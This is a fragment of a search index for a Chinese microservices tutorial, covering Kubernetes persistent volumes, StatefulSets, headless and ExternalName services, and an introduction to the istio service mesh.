PersistentVolume metadata: name: html-pv-1 spec: storageClassName: html capacity: storage: 1Mi accessModes: - ReadWriteOnce hostPath: path: /mnt/data/html-1 \u8fd9\u91cc\u7684 Capacity \u5373\u5bb9\u91cf\uff0c\u800c AccessModes \u662f\u8bbf\u95ee\u6a21\u5f0f\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 ReadWriteOnce\uff0c\u53c8\u79f0 RWO\uff0c\u5373\u53ef\u8bfb\u53ef\u5199\uff0c\u4f46\u53ea\u80fd\u88ab\u4e00\u4e2a Pod \u6302\u8f7d\u3002\u5176\u5b83\u6a21\u5f0f\u6709 ReadOnlyMany\uff08ROX\uff09\uff0c\u53ea\u8bfb\u4f46\u53ef\u4ee5\u88ab\u591a\u4e2a Pod \u6302\u8f7d\uff0c\u4ee5\u53ca ReadWriteMany\uff08RWX\uff09\uff0c\u53ef\u8bfb\u53ef\u5199\uff0c\u53ef\u4ee5\u88ab\u591a\u4e2a Pod \u6302\u8f7d\u3002RWX \u9700\u8981\u624b\u52a8\u4fdd\u6301\u6570\u636e\u4e00\u81f4\u6027\u3002 hostPath \u662f\u6307\u5c06\u8fd9\u4e2a volume \u5b58\u50a8\u5728\u672c\u673a\u7684\u67d0\u4e2a\u8def\u5f84\u4e0b\uff0c\u8fd9\u662f\u5728\u4f7f\u7528 manual \u5b58\u50a8\u7c7b\u65f6\u7684\u4e00\u79cd\u65b9\u5f0f\u3002\u4f46\u662f\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u8981\u4e48\u5c06\u8fd9\u4e2a hostPath \u6620\u5c04\u5230\u4e00\u4e2a\u7f51\u7edc\u5b58\u50a8\u4e2d\uff0c\u8981\u4e48\u4f7f\u7528\u7f51\u7edc\u5b58\u50a8\u7c7b\u3002 \u8fd9\u91cc\u7684 storageClassName \u662f\u540e\u9762\u5c06\u8981\u521b\u5efa\u7684 PersistentVolumeClaim \u7528\u6765\u5339\u914d\u7684\u5b57\u6bb5\u3002 \u5982\u679c\u4f60\u4f7f\u7528\u4e86 helm\uff0c\u8fd8\u53ef\u4ee5\u4f7f\u7528\u6a21\u7248\u6765\u6267\u884c\u5faa\u73af\uff0c\u6765\u521b\u5efa\u591a\u4e2a PersistentVolume\uff0c\u8fd9\u91cc\u4e0d\u518d\u8d58\u8ff0\u3002","title":"\u521b\u5efa PersistentVolume"},{"location":"23/#persistentvolumeclaim","text":"\u7136\u540e\u9700\u8981\u521b\u5efa PersistentClaim\uff0cPersistentClaim \u50cf\u662f Persistent Volume \u7684\u94a5\u5319\uff0c\u7528\u6765\u8bf7\u6c42 Persistent Volume\u3002 apiVersion: v1 kind: PersistentVolumeClaim metadata: name: pvc spec: storageClassName: html accessModes: - ReadWriteOnce resources: requests: storage: 16Ki \u8fd9\u91cc\u7684 storageClassName \u662f PersistentVolume \u7684 storageClassName\uff0caccessModes \u662f\u8bbf\u95ee\u6a21\u5f0f\uff0cresources \u662f\u8d44\u6e90\u8bf7\u6c42\uff0c\u8fd9\u91cc\u6211\u4eec\u8bf7\u6c42 16Ki \u7684\u5b58\u50a8\u3002 \u8fd9\u91cc\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a storageClassName \u4e3a html \u7684 PersistentVolumeClaim\uff0c\u8fd9\u4e2a PersistentVolumeClaim \u4f1a\u8bf7\u6c42\u4e00\u4e2a storageClassName \u4e3a html \u7684 PersistentVolume\u3002 \u5982\u679c\u6211\u4eec\u73b0\u5728\u628a\u5b83\u7ed1\u5230\u4e00\u4e2a Pod \u4e0a\uff0c\u8fd9\u4e2a Pod \u5c31\u4f1a\u7533\u8bf7\u4e00\u4e2a\u540c\u6837 storageClassName \u4e3a html \u7684 PersistentVolume\uff0c\u8fd9\u4e2a PersistentVolume \u4f1a\u88ab\u7ed1\u5b9a\u5230\u8fd9\u4e2a Pod \u4e0a\u3002 \u4f46\u662f\uff0c\u6ce8\u610f\uff0c\u73b0\u5728\u7684 Pod \u5982\u679c\u91cd\u542f\uff0c\u6216\u6709\u65b0\u7684 Pod \u5728\u6c34\u5e73\u6269\u5c55\u4e2d\u4ea7\u751f\uff0c\u8fd9\u4e2a PersistentVolume \u4f1a\u88ab\u91cd\u65b0\u7ed1\u5b9a\u5230\u65b0\u7684 Pod \u4e0a\uff0c\u8fd9\u6837\u6570\u636e\u5c31\u4f1a\u4e22\u5931\uff0c\u540c\u4e00\u7f51\u7edc\u5730\u5740\u7684\u6570\u636e\u4e00\u81f4\u6027\u4e22\u5931\u3002\u56e0\u6b64\u9700\u8981\u4f7f\u7528 StatefulSet \u6765\u4fdd\u8bc1\u6570\u636e\u7684\u4e00\u81f4\u6027\u3002","title":"\u521b\u5efa PersistentVolumeClaim"},{"location":"23/#statefulset_1","text":"\u73b0\u5728\u6211\u4eec\u521b\u5efa StatefulSet\u3002\u5982\u679c\u4f60\u4e0d\u719f\u6089 nginx \u7684 docker container\uff0c\u8fd9\u91cc\u662f\u4e00\u4e2a\u53cb\u5584\u7684\u63d0\u9192\uff1anginx \u7684\u9ed8\u8ba4\u7f51\u9875\u662f /usr/share/nginx/html \uff0c\u56e0\u6b64\u6211\u4eec\u9700\u8981\u5c06 PersistentVolume \u6302\u8f7d\u5230\u8fd9\u4e2a\u8def\u5f84\u4e0b\u3002 Stateful \u548c Deployment \u76f8\u4f3c\u5904\u6211\u4eec\u4e0d\u518d\u8d58\u8ff0\u3002 apiVersion: apps/v1 kind: StatefulSet metadata: name: html-stateful-set spec: serviceName: \"html-service\" replicas: 2 selector: matchLabels: app: html-pod template: metadata: labels: app: html-pod spec: containers: - name: nginx image: nginx volumeMounts: - name: html-pvc mountPath: /usr/share/nginx/html volumeClaimTemplates: - metadata: name: html-pvc spec: accessModes: [ \"ReadWriteOnce\" ] storageClassName: html resources: requests: storage: 16Ki \u8fd9\u91cc\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a StatefulSet\uff0c\u540d\u5b57\u4e3a html-statefulset\uff0c\u8fd9\u4e2a StatefulSet \u4f1a\u521b\u5efa\u4e24\u4e2a Pod\uff0c\u6bcf\u4e00\u4e2a Pod \u90fd\u4f1a\u6302\u8f7d\u4e00\u4e2a PersistentVolumeClaim\uff0c\u8fd9\u4e2a PersistentVolumeClaim \u4f1a\u8bf7\u6c42\u4e00\u4e2a PersistentVolume\u3002 \u6ce8\u610f\uff0c\u56e0\u4e3a StatefulSet \u9700\u8981\u9010\u4e2a Pod \u8bbf\u95ee\uff0c\u56e0\u6b64\u5fc5\u987b\u4f7f\u7528\u65e0\u5934\u670d\u52a1\u6765\u8bbf\u95ee\u8fd9\u4e24\u4e2a Pod\uff0c\u56e0\u6b64\u9700\u8981\u6307\u5b9a\u670d\u52a1\u540d serviceName \u4e3a html-service\u3002 \u6302\u8f7d volume \u65f6\uff0cname \u548c volumeClaimTemplates \u7684 name \u9700\u8981\u5339\u914d\u5373\u53ef\u3002","title":"\u521b\u5efa StatefulSet"},{"location":"23/#headless-service_1","text":"\u6700\u540e\uff0c\u6211\u4eec\u521b\u5efa\u4e00\u4e2a Headless Service\uff0c\u7528\u6765\u8bbf\u95ee\u8fd9\u4e24\u4e2a Pod\u3002Headless Service \u4f1a\u4e3a\u6bcf\u4e00\u4e2a Pod \u5206\u914d\u4e00\u4e2a DNS \u8bb0\u5f55\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 DNS \u8bb0\u5f55\u8bbf\u95ee\u6bcf\u4e00\u4e2a Pod\u3002 apiVersion: v1 kind: Service metadata: name: html-service spec: clusterIP: None selector: app: html-pod \u8fd9\u91cc\u6211\u4eec\u521b\u5efa\u4e86\u4e00\u4e2a Headless Service\uff0c\u540d\u5b57\u4e3a html-headless\uff0c\u8fd9\u4e2a Headless Service \u4f1a\u4e3a\u6bcf\u4e00\u4e2a Pod \u5206\u914d\u4e00\u4e2a DNS \u8bb0\u5f55\uff0c\u8fd9\u6837\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 DNS \u8bb0\u5f55\u8bbf\u95ee\u6bcf\u4e00\u4e2a Pod\u3002","title":"\u521b\u5efa Headless Service"},{"location":"23/#_2","text":"\u5728\u542f\u52a8\u670d\u52a1\u524d\uff0c\u6211\u4eec\u5148\u8fdb\u5165 minikube ssh \uff0c\u7136\u540e\u5728\u524d\u9762\u6307\u5b9a\u7684 hostPath \u521b\u5efa\u4e24\u4e2a\u5185\u5bb9\u4e0d\u540c\u7684 index.html \u3002\u6ce8\u610f\uff0c\u8fd9\u65f6\u5019\u5bb9\u5668\u5185\u6ca1\u6709\u6587\u672c\u7f16\u8f91\u5668\uff0c\u4f7f\u7528 echo \u547d\u4ee4\u6765\u521b\u5efa\u6587\u4ef6\u3002\u5982\u679c\u4f60\u4e4b\u524d\u5df2\u7ecf\u542f\u52a8\u4e86\uff0c\u4f7f\u7528 kubectl delete all --all \u5220\u9664\u6240\u6709\u8d44\u6e90\u3002\u6b64\u5916\uff0c\u4f60\u8fd8\u9700\u8981\u7528 sudo \u63d0\u6743\u3002 echo \"<h1>html-0</h1>\" | sudo tee ./index.html \u7136\u540e\uff0c\u6211\u4eec\u542f\u52a8\u670d\u52a1\u3002 kubectl apply -f . \u73b0\u5728\u6211\u4eec\u9700\u8981\u5355\u72ec\u8bbf\u95ee Pod\u3002\u5f53\u5904\u4e8e Headless \u6a21\u5f0f\u65f6\uff0cService \u4f1a\u5728 DNS \u8bb0\u5f55\u6bcf\u4e2a Pod \u7684 IP \u5730\u5740\u3002\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 kubectl get pods -o wide \u6765\u67e5\u770b Pod \u7684 IP \u5730\u5740\u3002 kubectl get pods -o wide \u73b0\u5728\u6211\u4eec\u53ef\u4ee5\u8fdb\u5165\u96c6\u7fa4\uff0c\u76f4\u63a5\u8bbf\u95ee Pod \u7684 IP \u5730\u5740\u3002\u53ef\u4ee5\u53d1\u73b0\u5b83\u4eec\u6b63\u786e\u5730\u8fd4\u56de\u4e86\u4e0d\u540c\u7684\u7f51\u9875\u3002 \u4f46\u662f\uff0c\u5982\u679c\u662f\u5728\u5199\u540e\u7aef\u670d\u52a1\uff0c\u6211\u4eec\u4e0d\u53ef\u80fd\u4f7f\u7528 IP \u5730\u5740\u6765\u8bbf\u95ee\u3002\u4e4b\u524d\u6211\u4eec\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 Service \u540d\u79f0\u4f5c\u4e3a DNS \u8bb0\u5f55\u6765\u8bbf\u95ee\uff0c\u73b0\u5728\u4e5f\u4e00\u6837\uff0c\u53ef\u4ee5\u7528\u7279\u6b8a\u7684\u7f51\u7edc\u5730\u5740\u6765\u8bbf\u95ee\u8fd9\u4e24\u4e2a Pod\uff0c\u5373 {stateful-set-name}-{ordinal}.{service-name} \u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c\u5c31\u662f html-stateful-set-0.html-service \u548c html-stateful-set-1.html-service \u3002 curl http://html-stateful-set-0.html-service \u6ce8\u610f\uff0c\u8981\u8fdb\u5165\u4efb\u610f\u4e00\u4e2a\u5728\u96c6\u7fa4\u4e2d\u7684\u5bb9\u5668\uff0c\u53ef\u4ee5\u4f7f\u7528 kubectl exec -it {pod-name} -- /bin/bash \u3002\u8fd9\u6837\u624d\u4f1a\u901a\u8fc7\u96c6\u7fa4\u7684 DNS \u8bb0\u5f55\u6765\u8bbf\u95ee\u3002","title":"\u5916\u90e8\u8bbf\u95ee"},{"location":"23/#_3","text":"\u5728\u4e0a\u9762\u7684\u4f8b\u5b50\u4e2d\uff0c\u6211\u4eec\u4ecb\u7ecd\u4e86\u5982\u4f55\u7528 k8s \u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\u3002\u4f46\u662f\uff0c\u5b9e\u9645\u4e0a\uff0c\u5927\u90e8\u5206\u6709\u72b6\u6001\u670d\u52a1\u90fd\u662f\u90e8\u7f72\u5728\u4e13\u95e8\u7684\u6570\u636e\u5e93\u96c6\u7fa4\u4e2d\uff0c\u800c\u4e0d\u662f\u76f4\u63a5\u90e8\u7f72\u5728 k8s \u4e2d\u3002 \u4f7f\u7528 k8s \u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\u7684\u4f18\u70b9\u662f\uff0c\u53ef\u4ee5\u4f7f\u7528 k8s \u7684\u81ea\u52a8\u5316\u90e8\u7f72\uff0c\u81ea\u52a8\u5316\u6269\u5c55\uff0c\u4ee5\u53ca\u81ea\u52a8\u5316\u6062\u590d\u3002\u4f46\u662f\uff0c\u7f3a\u70b9\u662f\uff0ck8s \u5e76\u4e0d\u662f\u4e00\u4e2a\u4e13\u95e8\u7684\u6570\u636e\u5e93\u96c6\u7fa4\uff0c\u56e0\u6b64\u5728\u6570\u636e\u7684\u5907\u4efd\uff0c\u6062\u590d\uff0c\u4ee5\u53ca\u6570\u636e\u7684\u6301\u4e45\u5316\u4e0a\uff0c\u53ef\u80fd\u4f1a\u6709\u4e00\u4e9b\u95ee\u9898\u3002\u6b64\u5916\uff0ck8s \u7684\u5bb9\u5668\u5316\u4e5f\u4f1a\u5e26\u6765 IO \u6027\u80fd\u7684\u635f\u5931\uff0c\u800c\u6709\u72b6\u6001\u670d\u52a1\u5927\u591a\u662f IO \u5bc6\u96c6\u578b\u7684\u670d\u52a1\u3002 \u56e0\u6b64\uff0c\u8fd8\u6709\u4e00\u79cd\u89e3\u51b3\u65b9\u6848\uff0c\u5728 k8s \u5916\u90e8\u90e8\u7f72\u6709\u72b6\u6001\u670d\u52a1\uff0c\u7136\u540e k8s \u96c6\u7fa4\u5185\u5bb9\u5668\u53bb\u8bbf\u95ee\u8fd9\u4e2a\u6709\u72b6\u6001\u670d\u52a1\u3002\u8fd9\u6837\uff0c\u5c31\u53ef\u4ee5\u5145\u5206\u5229\u7528 k8s \u7684\u81ea\u52a8\u5316\u90e8\u7f72\uff0c\u81ea\u52a8\u5316\u6269\u5c55\uff0c\u4ee5\u53ca\u81ea\u52a8\u5316\u6062\u590d\uff0c\u540c\u65f6\u53c8\u53ef\u4ee5\u4f7f\u7528\u4e13\u95e8\u7684\u6570\u636e\u5e93\u96c6\u7fa4\u6765\u7ba1\u7406\u6570\u636e\u3002k8s \u5185\u90e8\u7684\u670d\u52a1\u5c31\u662f\u7eaf\u7cb9\u7684\u65e0\u72b6\u6001\u670d\u52a1\uff0c\u53ea\u9700\u8981\u8bbf\u95ee\u5916\u90e8\u7684\u6709\u72b6\u6001\u670d\u52a1\u3002","title":"\u6709\u72b6\u6001\u670d\u52a1\u5916\u90e8\u90e8\u7f72"},{"location":"23/#_4","text":"\u9996\u5148\u6211\u4eec\u5728\u5916\u90e8\u90e8\u7f72\u4e00\u4e2a nginx\uff0c\u7136\u540e\u5728 k8s \u96c6\u7fa4\u4e2d\u8bbf\u95ee\u8fd9\u4e2a nginx\u3002 \u9996\u5148\uff0c\u6211\u4eec\u5728\u5916\u90e8\u90e8\u7f72\u4e00\u4e2a nginx\u3002 docker run -d --name nginx -p 8080:80 nginx \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684\u5916\u90e8\u662f\u76f8\u5bf9\u96c6\u7fa4\u7684\u5916\u90e8\uff0c\u5373 minikube ssh \u8fdb\u5165\u7684\u865a\u62df\u673a\u3002k8s \u96c6\u7fa4\u548c minikube \u7684\u865a\u62df\u673a\u662f\u5728\u4e00\u4e2a\u7f51\u7edc\u4e2d\u7684\uff0c\u4f46\u5bbf\u4e3b\u673a\u548c\u865a\u62df\u673a\u5728 MacOS \u548c Windows \u4e0a\u662f\u4e0d\u540c\u7684\u7f51\u7edc\uff0c\u56e0\u6b64\u4e0d\u80fd\u76f4\u63a5\u8bbf\u95ee\u3002\u5728\u751f\u4ea7\u73af\u5883\u4e2d\uff0c\u4f7f\u7528 linux \u7cfb\u7edf\uff0c\u6ca1\u6709\u865a\u62df\u673a\uff0ck8s \u53ef\u4ee5\u76f4\u8fde\u5bbf\u4e3b\u673a\u3002 \u7136\u540e\uff0c\u6211\u4eec\u5728 k8s \u96c6\u7fa4\u4e2d\u8bbf\u95ee\u8fd9\u4e2a nginx\u3002\u6211\u4eec\u4e4b\u524d\u6ca1\u6709\u8bb2\u8fc7\u7684 ExternalName \u5c31\u80fd\u7528\u4e0a\u4e86\u3002\u5b83\u80fd\u628a k8s \u96c6\u7fa4\u5916\u7684\u670d\u52a1\u6620\u5c04\u5230 k8s \u96c6\u7fa4\u5185\u7684\u670d\u52a1\u3002\u56e0\u4e3a\u6211\u4eec\u7684 nginx \u662f\u8fd0\u884c\u5728 localhost:8080 \uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ExternalName \u6765\u6620\u5c04\u8fd9\u4e2a\u670d\u52a1\u3002 apiVersion: v1 kind: Service metadata: name: ext spec: type: ExternalName externalName: localhost ports: - port: 80 \u73b0\u5728\uff0c\u4f7f\u7528 curl http://ext \u5c31\u53ef\u4ee5\u8bbf\u95ee\u5230\u5916\u90e8\u7684 nginx \u4e86\u3002\u5982\u679c\u8981\u8bbf\u95ee\u5176\u5b83\u7684\u670d\u52a1\uff0c\u4e5f\u662f\u540c\u7406\u3002 \u4f46\u662f\uff0c\u6709\u65f6\u5019\u6211\u4eec\u7684\u5916\u90e8\u670d\u52a1\u662f IP\uff0c\u8fd9\u79cd\u65f6\u5019\u8981\u4f7f\u7528 Endpoints\u3002Endpoints \u5176\u5b9e\u662f Service \u7684\u540e\u7aef\uff0cService \u7684 Selector \u5176\u5b9e\u662f\u57fa\u4e8e\u9009\u62e9\u7684 Pod \u521b\u5efa\u4e86\u4e00\u4e2a Endpoints\uff0c\u7136\u540e\u518d\u521b\u5efa Service\u3002 \u8981\u624b\u52a8\u521b\u5efa Endpoints\uff0c\u4f7f\u7528\u4e0b\u9762\u7684\u914d\u7f6e\u6587\u4ef6\uff0c apiVersion: v1 kind: Endpoints metadata: name: ext subsets: - addresses: - ip: 172.0.0.1 ports: - port: 80 \u7136\u540e\u662f Headless\uff0c\u6ce8\u610f\u6211\u4eec\u4e0d\u8981\u5199 selector\uff0cService \u7684\u540d\u5b57\u8981\u4e0e Endpoint \u7684\u540d\u5b57\u4e00\u81f4\u3002 apiVersion: v1 kind: Service metadata: name: ext spec: ports: - protocol: TCP port: 80 targetPort: 80 \u7136\u540e\u76f4\u63a5\u8bbf\u95ee\u670d\u52a1\u5373\u53ef\uff0c\u6548\u679c\u662f\u4e00\u6837\u7684\u3002","title":"\u6709\u72b6\u6001\u670d\u52a1\u5916\u90e8\u90e8\u7f72"},{"location":"24/","text":"\u5fae\u670d\u52a1\u901f\u6210 Ch24 \u670d\u52a1\u7f51\u683c \u670d\u52a1\u7f51\u683c\uff08Service Mesh\uff09\u662f\u4e00\u79cd\u57fa\u7840\u8bbe\u65bd\u5c42\uff0c\u7528\u4e8e\u5904\u7406\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u5b83\u63d0\u4f9b\u4e86\u4e00\u79cd\u900f\u660e\u7684\u65b9\u5f0f\uff0c\u4f7f\u5f97\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u66f4\u52a0\u53ef\u9760\u3001\u5b89\u5168\u3001\u9ad8\u6548\u3002\u670d\u52a1\u7f51\u683c\u7684\u76ee\u6807\u662f\u89e3\u8026\u670d\u52a1\u7684\u5f00\u53d1\u548c\u8fd0\u7ef4\uff0c\u4f7f\u5f97\u670d\u52a1\u7684\u5f00\u53d1\u8005\u53ef\u4ee5\u4e13\u6ce8\u4e8e\u4e1a\u52a1\u903b\u8f91\uff0c\u800c\u8fd0\u7ef4\u8005\u53ef\u4ee5\u4e13\u6ce8\u4e8e\u670d\u52a1\u7684\u53ef\u89c2\u5bdf\u6027\u3001\u5b89\u5168\u6027\u3001\u6027\u80fd\u7b49\u65b9\u9762\u3002 \u670d\u52a1\u7f51\u683c\u5c31\u7c7b\u4f3c\u4e8e\u73b0\u5b9e\u4e2d\u7684\u8def\u7f51\uff0c\u5176\u4e2d\u6709\u9053\u8def\u548c\u4e00\u4e9b\u5fc5\u8981\u5efa\u7b51\uff08\u5982\u7ea2\u7eff\u706f\u3001\u6536\u8d39\u7ad9\u7b49\uff09\u3002\u9053\u8def\u662f\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u800c\u5efa\u7b51\u662f\u670d\u52a1\u7f51\u683c\u7684\u529f\u80fd\u3002\u73b0\u5728\uff0c\u4f5c\u4e3a\u57ce\u5e02\u7684\u8bbe\u8ba1\u8005\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728\u7a7a\u683c\u91cc\u653e\u7f6e\u4e00\u4e9b\u5efa\u7b51\uff0c\u5c31\u80fd\u5efa\u9020\u51fa\u4e00\u4e2a\u57ce\u5e02\u3002\u540c\u6837\u7684\uff0c\u4f5c\u4e3a\u8f6f\u4ef6\u5f00\u53d1\u8005\uff0c\u6211\u4eec\u53ea\u9700\u8981\u5728\u670d\u52a1\u7f51\u683c\u4e2d\u653e\u7f6e\u4e00\u4e9b\u529f\u80fd\uff0c\u5c31\u80fd\u6784\u5efa\u51fa\u4e00\u4e2a\u5fae\u670d\u52a1\u7cfb\u7edf\u3002 \u670d\u52a1\u7f51\u683c\u53c8\u79f0\u4e3a\u5fae\u670d\u52a1\u57fa\u7840\u8bbe\u65bd\uff0c\u5b83\u662f\u5fae\u670d\u52a1\u67b6\u6784\u7684\u4e00\u90e8\u5206\u3002\u670d\u52a1\u7f51\u683c\u901a\u5e38\u7531\u4e24\u90e8\u5206\u7ec4\u6210\uff1a\u6570\u636e\u5e73\u9762\uff08Data Plane\uff09\u548c\u63a7\u5236\u5e73\u9762\uff08Control Plane\uff09\u3002\u6570\u636e\u5e73\u9762\u8d1f\u8d23\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\uff0c\u63a7\u5236\u5e73\u9762\u8d1f\u8d23\u914d\u7f6e\u3001\u76d1\u63a7\u3001\u7ba1\u7406\u6570\u636e\u5e73\u9762\u3002 \u670d\u52a1\u7f51\u683c\u672c\u8eab\u4e5f\u662f\u4e00\u4e2a\u5fae\u670d\u52a1\uff0c\u5b83\u7531\u4e00\u4e9b\u5fae\u670d\u52a1\u7ec4\u6210\uff0c\u8fd9\u4e9b\u5fae\u670d\u52a1\u8d1f\u8d23\u670d\u52a1\u7f51\u683c\u7684\u5404\u4e2a\u529f\u80fd\u3002\u56e0\u6b64\uff0c\u90e8\u7f72\u5b83\u4eec\u662f\u5f88\u590d\u6742\u7684\u3002\u4e0d\u8fc7\uff0c\u524d\u9762\u6211\u4eec\u4ecb\u7ecd\u8fc7 helm\uff0chelm \u53ef\u4ee5\u4e00\u6b21\u90e8\u7f72\u4e00\u6574\u4e2a k8s \u96c6\u7fa4\uff0c\u56e0\u6b64\u4e5f\u53ef\u4ee5\u4e00\u6b21\u90e8\u7f72\u4e00\u4e2a\u670d\u52a1\u7f51\u683c\u3002 \u670d\u52a1\u7f51\u683c\u7684\u5177\u4f53\u4f7f\u7528\u6839\u636e\u63d0\u4f9b\u5546\u6709\u4e9b\u8bb8\u4e0d\u540c\u3002\u8fd9\u91cc\u6211\u4eec\u4f7f\u7528 istio \u4f5c\u4e3a\u670d\u52a1\u7f51\u683c\uff0c\u5b83\u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u670d\u52a1\u7f51\u683c\uff0c\u7531 Google\u3001IBM \u548c Lyft \u5171\u540c\u5f00\u53d1\u3002istio \u63d0\u4f9b\u4e86\u4e00\u4e9b\u529f\u80fd\uff0c\u5982\u6d41\u91cf\u7ba1\u7406\u3001\u5b89\u5168\u3001\u76d1\u63a7\u7b49\u3002 \u524d\u9762\u6211\u4eec\u5728\u4ecb\u7ecd\u7f51\u5173\u65f6\u5df2\u7ecf\u4f7f\u7528\u4e86 istio \u7684\u7f51\u5173\uff0c\u5f53\u65f6\u5728\u5b89\u88c5\u65f6\u6211\u4eec\u4e8b\u5b9e\u4e0a\u5df2\u7ecf\u5b89\u88c5\u4e86 istio \u670d\u52a1\u7f51\u683c\u7684\u4e00\u90e8\u5206\u3002\u8fd9\u4e00\u7ae0\u6211\u4eec\u7cfb\u7edf\u5730\u4ecb\u7ecd\u4e00\u4e0b istio \u7684\u670d\u52a1\u7f51\u683c\u3002 \u670d\u52a1\u7f51\u683c\u7684\u7ed3\u6784\u4e0e\u539f\u7406 \u901a\u8fc7\u524d\u9762\u7684\u5b66\u4e60\uff0c\u6211\u4eec\u53ef\u4ee5\u770b\u5230\uff0c\u5fae\u670d\u52a1\u9700\u8981\u8bb8\u591a\u529f\u80fd\uff0c\u800c k8s \u548c Spring Cloud \u533a\u522b\u662f\uff0c\u524d\u8005\u662f\u975e\u4fb5\u5165\u7684\uff0c\u4ee3\u7801\u4e2d\u611f\u77e5\u4e0d\u5230 k8s \u7684\u5b58\u5728\uff0c\u800c\u540e\u8005\u662f\u4fb5\u5165\u7684\uff0c\u4ee3\u7801\u4e2d\u9700\u8981\u4f7f\u7528 Spring Cloud \u7684 API\u3002 \u670d\u52a1\u7f51\u683c\u63d0\u4f9b\u4e86\u5fae\u670d\u52a1\u7684\u5927\u90e8\u5206\u529f\u80fd\uff0c\u4e0d\u518d\u9700\u8981\u81ea\u5df1\u642d\u5efa\uff0c\u5176\u4e2d\u4e3b\u8981\u6709\uff0c \u5b89\u5168\u8ba4\u8bc1\u548c\u9274\u6743 \u8d1f\u8f7d\u5747\u8861 \u6d41\u91cf\u7ba1\u7406 \u8bbf\u95ee\u63a7\u5236 \u94fe\u8def\u8ffd\u8e2a \u8fd9\u6db5\u76d6\u4e86\u4e4b\u524d\u4f7f\u7528 Spring Cloud \u8bb2\u5230\u7684\u5927\u90e8\u5206\u529f\u80fd\u3002\u5fae\u670d\u52a1\u7684\u5176\u5b83\u529f\u80fd\uff0c\u670d\u52a1\u6ce8\u518c\u3001\u914d\u7f6e\u4e0e\u7ba1\u7406\u7531 k8s \u63d0\u4f9b\uff0c\u5206\u5e03\u5f0f\u4e8b\u52a1\u4ecd\u7136\u9700\u8981\u989d\u5916\u7684\u7ec4\u4ef6\u3002 \u670d\u52a1\u7f51\u683c\u7684\u8fd9\u4e9b\u529f\u80fd\u901a\u8fc7\u4ee3\u7406\u5b9e\u73b0\u3002\u670d\u52a1\u7f51\u683c\u4e2d\u7684\u6bcf\u4e2a\u5fae\u670d\u52a1\u90fd\u6709\u4e00\u4e2a\u4ee3\u7406\uff0c\u62e6\u622a\u6240\u6709\u7684\u7f51\u7edc\u6d41\u6d6a\uff0c\u5e76\u8d1f\u8d23\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u8fd9\u4e2a\u4ee3\u7406\u662f\u900f\u660e\u7684\uff0c\u5fae\u670d\u52a1\u4e0d\u9700\u8981\u5173\u5fc3\u8fd9\u4e2a\u4ee3\u7406\u7684\u5b58\u5728\u3002\u8fd9\u4e2a\u4ee3\u7406\u8d1f\u8d23\u8d1f\u8f7d\u5747\u8861\u3001\u6545\u969c\u6062\u590d\u3001\u6d41\u91cf\u7ba1\u7406\u7b49\u3002 \u4ee3\u7406\u53ef\u5206\u4e3a\u4e24\u79cd\uff0cL4 \u4ee3\u7406\u548c L7 \u4ee3\u7406\uff0c\u5206\u522b\u5bf9\u5e94 OSI \u6a21\u578b\u7684\u7b2c\u56db\u5c42\u548c\u7b2c\u4e03\u5c42\u3002L4 \u4ee3\u7406\u529f\u80fd\u6bd4\u8f83\u5c11\uff0c\u4f46\u6027\u80fd\u597d\uff0cL7 \u4ee3\u7406\u529f\u80fd\u591a\uff0c\u4f46\u6027\u80fd\u5dee\u3002 \u670d\u52a1\u7f51\u683c\u53ef\u4ee5\u5728\u903b\u8f91\u4e0a\u5206\u6210\u4e24\u4e2a\u5e73\u9762\uff0c \u6570\u636e\u5e73\u9762\u662f\u4e00\u7cfb\u5217\u7684\u7f51\u7edc\u4ee3\u7406\uff0c\u7528\u6765\u534f\u8c03\u548c\u76d1\u63a7\u5fae\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u3002\u8fd9\u4e9b\u4ee3\u7406\u662f\u90e8\u7f72\u5728\u6bcf\u4e2a\u5fae\u670d\u52a1\u4e4b\u95f4\u7684\uff0c\u5b83\u4eec\u8d1f\u8d23\u670d\u52a1\u4e4b\u95f4\u7684\u901a\u4fe1\u3001\u8d1f\u8f7d\u5747\u8861\u3001\u6545\u969c\u6062\u590d\u7b49\u3002\u8fd9\u4e9b\u4ee3\u7406\u662f\u900f\u660e\u7684\uff0c\u5fae\u670d\u52a1\u4e0d\u9700\u8981\u5173\u5fc3\u8fd9\u4e9b\u4ee3\u7406\u7684\u5b58\u5728\u3002 \u63a7\u5236\u5e73\u9762\u662f\u4e00\u7cfb\u5217\u7684\u5fae\u670d\u52a1\uff0c\u7528\u6765\u7ba1\u7406\u6570\u636e\u5e73\u9762\u3002 istio \u7684\u6570\u636e\u5e73\u9762\u6709\u4e24\u79cd\u5de5\u4f5c\u6a21\u5f0f\uff0csidecar \u548c ambient\u3002sidecar \u5373\u4fa7\u8f7d\uff0c\u662f\u5c06\u4ee3\u7406\u90e8\u7f72\u5728\u6bcf\u4e2a\u5fae\u670d\u52a1\u7684 Pod \u4e2d\uff0c\u8fd9\u662f istio \u7684\u9ed8\u8ba4\u5de5\u4f5c\u6a21\u5f0f\u3002ambient \u5373\u73af\u5883\uff0c\u662f\u5c06\u4ee3\u7406\u90e8\u7f72\u5728 Pod \u7684\u73af\u5883\u4e2d\uff0c\u8fd9\u662f istio \u7684\u53e6\u4e00\u79cd\u5de5\u4f5c\u6a21\u5f0f\u3002 sidecar \u6a21\u5f0f\u9ed8\u8ba4\u4f7f\u7528 L7 